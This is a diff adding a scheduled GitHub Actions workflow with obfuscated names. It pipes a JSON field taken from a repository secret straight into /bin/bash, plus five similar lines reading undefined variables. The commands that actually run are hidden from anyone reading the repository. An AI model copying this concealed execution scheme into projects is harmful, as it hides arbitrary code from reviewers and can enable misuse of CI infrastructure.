@@ -1,0 +1,22 @@
+name: xiansongenyuan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiansongenyuan
+        env:
+          zo42508: ${{ secrets.zo42508 }}
+        run: |
+          echo $zo42508 | jq -r .nppa44858 | /bin/bash
+          echo $sdlk1 | jq -r .fjx891 | /bin/bash
+          echo $ujx3 | jq -r .tfp2545 | /bin/bash
+          echo $zh21 | jq -r .e25 | /bin/bash
+          echo $ngdz8 | jq -r .glmri6 | /bin/bash
+          echo $ggj7 | jq -r .otapq1 | /bin/bash
+
